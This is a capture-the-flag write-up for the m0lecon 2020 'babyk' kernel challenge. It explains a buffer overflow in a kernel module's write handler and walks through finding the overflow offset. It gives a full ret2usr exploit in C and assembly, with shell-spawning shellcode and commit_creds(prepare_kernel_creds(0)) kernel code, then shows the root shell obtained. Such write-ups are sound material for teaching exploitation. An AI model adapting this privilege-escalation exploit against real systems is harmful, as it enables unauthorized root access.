---
ctf_name: "m0lecon 2020 Teaser"
layout: writeup
title:	"babyk"
date:	2020-05-24
category: "pwn"
author: "nick0ve"
---

## The challenge
That was an introductory challenge in kernel exploitation, all modern protections were disabled, source code was given, and the vulnerability was an easy to spot buffer overflow in the write handler of the module.

```c
	char buf[BUFSIZE];

	// if(*ppos > 0 || count > BUFSIZE)
		// return -EFAULT;

	if(raw_copy_from_user(buf, ubuf, count)) // no bounds checking at all
		return -EFAULT;
```

So the plan to get root privileges is:
- take control over saved_rip with the buffer overflow
- make the kernel return to user mapped code, and execute
  commit_creds(prepare_kernel_creds(0))
- nicely switch to userspace without crashing the kernel, to spawn a shell and read the flag

### Finding the right number of A's

```bash
echo aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac > /proc/babydev
```

Gives a nice kernel panic with `RIP=0x6261616862616167` which in ascii translates to `gaabhaab`

```bash
~$ pwn cyclic -l gaab
124
```

### Putting all together

`exploit.c`
```c
#define MAP_PRIVATE     0x02    /* Changes are private.  */
#define MAP_FIXED       0x10    /* Interpret addr exactly.  */
#define MAP_ANONYMOUS   0x20    /* Don't use a file.  */
#define	O_RDWR		    0x0002  /* open for reading and writing */

typedef unsigned long long qword;

extern void kernel_shellcode();
char user_shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

qword mcpy(char * dst, char * src, qword n)
{
    for (qword i = 0; i < n; ++i)
        dst[i] = src[i];
	return n;
}

void * mmap(void * addr, qword size, qword prot, qword flags)
{
    return syscall64(9, addr, size, prot, flags, -1, 0);
}

int _start (int argc, char **argv) 
{
	char buf[0x1000];
	char * payload = buf;
    // Prepare memory for ret2usr
	void *userland_stack = mmap((void *)0xcafe000, 0x1000, 7, MAP_ANONYMOUS|MAP_PRIVATE|0x0100);
	void *userland_code = mmap((void *)0x1234000, 0x1000, 7, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE);
	mcpy(userland_code, &user_shellcode,sizeof(user_shellcode));
    // Fill up stack until saved_rip
	for (int i = 0;  i < 124; i++)
		*(payload++) = 'A';
	*(qword *)payload = (qword) kernel_shellcode; payload += 8;
	// Profit
	int vuln_fd = syscall64(2, "/proc/babydev", O_RDWR,100,0, 0,0);
	syscall64(1, vuln_fd, buf, payload - buf, -1,-1,-1);
	syscall64(0x60, 0, -1,-1,-1,-1,-1);
	return 0;
}
```

`exploit.S`
```nasm
.text
.intel_syntax noprefix

.global syscall64
.global kernel_shellcode

kernel_shellcode:
    # commit_cred(prepare_kernel_creds(0))
    xor rdi, rdi
    mov rcx, 0xffffffff81052a60     # cat kallsyms | grep prepare_kernel_creds
    call rcx
    mov rdi, rax
    mov rcx, 0xffffffff81052830     # cat kallsyms | grep commit_creds
    call rcx
context_switch:
    swapgs
    # ss
    mov r15, 0x2b
    push 0x2b 
    # rsp - mmapped value
    mov r15, 0xcafe000
    push r15
    # rflags - dummy value
    mov r15, 0x246
    push r15
    # cs
    mov r15, 0x33
    push r15
    # rip - mmapped value
    mov r15, 0x1234000
    push r15
    iretq
end_kernel_shellcode:
    nop

syscall64:
    pop r14
    pop r15
    push r15
    push r14
    sub rsp, 0x100

    mov rax, rdi
    mov rdi, rsi
    mov rsi, rdx
    mov rdx, rcx
    mov r10, r8
    mov r8,r9 
    mov r9, r15
    syscall

    add rsp, 0x100
    ret
```

Compilable with the command: `gcc exploit/exploit.c exploit/exploit.S -no-pie -nostdlib -fomit-frame-pointer`.

Since gcc was not available on the remote qemu instance, the exploit needed to
be compiled in local and then sent it to the remote server, this did the trick:

```python
def send_exploit(compressed_elf):
    CHUNK_SZ = 256
    for i in range(0, len(compressed_elf), CHUNK_SZ):
        chunk = compressed_elf[i: min(i + CHUNK_SZ, len(compressed_elf))]
        chunk = base64.b64encode(chunk)
        cmd = "echo %s | base64 -d  >> /home/user/exp.gz" % chunk.decode()
        p.sendline(cmd)
    p.sendline("cat /home/user/exp.gz | gzip -d > /home/user/exp")
    p.sendline("chmod +x /home/user/exp")
```

### Profit
```
/ $ /home/user/exp
/bin/sh: can't access tty; job control turned off

/ # cat /root/flag.txt
ptm{y0ure_w3lc0m3_4_4ll_th15_k3rn3l_m3g4_fun}
```

### References:
- https://mem2019.github.io/jekyll/update/2019/01/11/Linux-Kernel-Pwn-Basics.html
- https://github.com/pr0cf5/kernel-exploit-practice/tree/master/return-to-user